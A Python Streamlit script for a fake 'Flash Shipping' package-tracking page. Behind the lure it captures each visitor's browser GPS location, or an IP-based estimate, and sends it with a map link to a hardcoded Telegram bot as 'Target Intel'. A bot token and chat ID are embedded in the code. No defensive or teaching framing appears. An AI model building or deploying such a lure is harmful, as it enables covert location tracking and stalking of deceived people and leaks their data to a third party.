import streamlit as st
import requests
import pandas as pd
import streamlit.components.v1 as components
from streamlit_geolocation import streamlit_geolocation
from datetime import datetime

# --- CONFIGURATION (REPLACE THESE) ---
TELEGRAM_BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
TELEGRAM_CHAT_ID = "7964118615"

# 1. UI Setup
st.set_page_config(page_title="Flash Shipping - Track Package", page_icon="📦")
st.title("📦 Package Tracking Portal")
st.write("Redirecting to your delivery status...")

# Function to send data to Telegram
def send_telegram_alert(data):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Formatting the message
    msg = (
        f"🚨 *Target Intel Captured*\n"
        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🌐 IP: `{data['IP Address']}`\n"
        f"📍 Location: {data['City']}, {data['Country']}\n"
        f"🛰️ Lat/Lon: `{data['Latitude']}, {data['Longitude']}`\n"
        f"🔗 [Google Maps](https://www.google.com/maps?q={data['Latitude']},{data['Longitude']})"
    )
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": msg,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        st.error(f"Telegram Alert Failed: {e}")

# 2. DATA GRAB
try:
    geo = streamlit_geolocation()

    # Priority 1: Precise Browser GPS
    if geo and geo.get("latitude") is not None:
        target_data = {
            "IP Address": "N/A (Browser GPS)",
            "City": geo.get("city") or "Unknown",
            "Country": geo.get("country") or "Unknown",
            "Latitude": geo.get("latitude"),
            "Longitude": geo.get("longitude"),
        }
    # Priority 2: IP-based Fallback
    else:
        try:
            # Cloudflare sends the IP in the 'CF-Connecting-IP' header
            # If not available, we use an external API
            ip_resp = requests.get("https://ipapi.co/json/").json()
            target_data = {
                "IP Address": ip_resp.get("ip"),
                "City": ip_resp.get("city"),
                "Country": ip_resp.get("country_name"),
                "Latitude": ip_resp.get("latitude"),
                "Longitude": ip_resp.get("longitude"),
            }
        except:
            target_data = None

    # 3. TRIGGER ALERT
    if target_data and "alert_sent" not in st.session_state:
        send_telegram_alert(target_data)
        st.session_state["alert_sent"] = True # Prevent duplicate alerts per session

    # Dashboard display
    if target_data:
        st.subheader("🕵️ Target Intel")
        st.json(target_data)
        
        # Display Map
        map_data = pd.DataFrame({"lat": [target_data["Latitude"]], "lon": [target_data["Longitude"]]})
        st.map(map_data)

except Exception as e:
    st.error(f"System Error: {e}")
